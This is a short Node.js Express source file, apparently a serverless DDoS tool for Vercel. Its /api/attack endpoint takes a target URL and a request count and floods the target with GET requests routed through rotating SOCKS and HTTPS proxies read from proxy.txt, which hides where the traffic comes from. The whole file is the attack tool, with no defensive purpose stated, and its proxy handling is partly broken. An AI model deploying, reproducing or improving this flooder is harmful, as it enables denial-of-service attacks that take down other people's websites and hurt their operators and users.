const express = require('express');
const serverless = require('serverless-http');
const axios = require('axios');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');
const fs = require('fs');
const app = express();

app.use(express.json()); // Middleware untuk parsing JSON request body

// API Endpoint untuk menerima attack request
app.post('/api/attack', (req, res) => {
  const { text: targetUrl, method, totalRequests } = req.body;

  if (!targetUrl || !method || !totalRequests) {
    return res.status(400).json({ message: 'Missing required parameters' });
  }

  // Baca daftar proxy dari file
  const proxyList = readProxyList();
  if (proxyList.length === 0) {
    return res.status(500).json({ message: 'No proxies found in proxy list' });
  }

  let currentIndex = 0;
  const proxyUrl = proxyList[currentIndex];
  let agent;

  if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
    agent = new SocksProxyAgent(proxyUrl);
  } else if (proxyUrl.startsWith('https')) {
    agent = new HttpsProxyAgent(proxyUrl);
  }

  sendRequests(targetUrl, agent, totalRequests, currentIndex, proxyList, res);
});

// Fungsi untuk membaca daftar proxy dari file
function readProxyList() {
  try {
    const data = fs.readFileSync('proxy.txt', 'utf8');
    return data.trim().split('\n').map(line => line.trim());
  } catch (error) {
    console.error('Failed to read proxy list:', error);
    return [];
  }
}

// Fungsi untuk mengirimkan requests ke target
function sendRequests(target, agent, totalRequests, currentIndex, proxyList, res) {
  if (currentIndex >= proxyList.length) {
    return res.json({ message: 'Attack started successfully' });
  }

  for (let i = 0; i < totalRequests; i++) {
    axios
      .get(target, { httpAgent: agent })
      .then((response) => {
        // Success callback, handle response if needed
      })
      .catch((error) => {
        console.error('Request failed', error);
      });
  }

  // Move to the next proxy after sending requests
  currentIndex++;
  const nextProxyUrl = proxyList[currentIndex];
  let nextAgent;

  if (nextProxyUrl.startsWith('socks4') || nextProxyUrl.startsWith('socks5')) {
    nextAgent = new SocksProxyAgent(nextProxyUrl);
  } else if (nextProxyUrl.startsWith('https')) {
    nextAgent = new HttpsProxyAgent(nextProxyUrl);
  }

  // Recursively send the next set of requests
  setTimeout(() => {
    sendRequests(target, nextAgent, totalRequests, currentIndex, proxyList, res);
  }, 100); // Add delay if needed
}

// Export as serverless handler for Vercel
module.exports.handler = serverless(app);
